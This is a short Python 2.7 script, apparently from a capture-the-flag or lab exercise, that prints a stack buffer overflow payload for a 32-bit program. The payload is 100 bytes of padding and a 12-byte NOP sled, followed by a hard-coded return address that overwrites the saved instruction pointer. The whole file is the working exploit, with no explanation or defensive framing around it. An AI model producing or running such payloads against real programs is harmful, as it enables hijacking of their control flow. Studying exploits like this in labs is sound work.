#!/usr/bin/python2.7
import struct
p = lambda x: struct.pack('<I', x)
nop='\x90'
eip=p(0x08048505)
print 'A'*100 + nop*12 + eip
